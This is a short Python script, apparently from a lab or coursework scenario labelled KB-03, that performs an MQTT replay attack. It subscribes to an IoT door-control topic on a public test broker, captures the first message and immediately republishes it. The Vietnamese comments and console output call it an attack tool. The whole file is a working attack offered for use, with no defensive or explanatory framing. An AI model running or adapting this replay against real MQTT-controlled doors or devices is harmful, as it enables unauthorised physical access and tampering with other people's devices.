import paho.mqtt.client as mqtt
import json
import time

BROKER = "test.mosquitto.org"
PORT = 1883
TOPIC = "iot/door/control"
attack_done = False

def on_message(client, userdata, msg):
    global attack_done
    if attack_done: return
        
    payload = msg.payload.decode()
    print(f"\n[!!!] Đã bắt được gói tin: {payload}")
    print("[*] (KB-03) Bắn lại gói tin ngay lập tức (Immediate Replay)...")
    
    # Gửi lại nguyên bản gói tin vừa bắt được ngay lập tức
    client.publish(TOPIC, payload)
    attack_done = True
    time.sleep(1)
    client.disconnect()

client = mqtt.Client()
client.on_message = on_message
client.connect(BROKER, PORT, 60)
client.subscribe(TOPIC)
print("--- KHỞI ĐỘNG CÔNG CỤ TẤN CÔNG (KB-03: IMMEDIATE REPLAY) ---")
client.loop_forever()
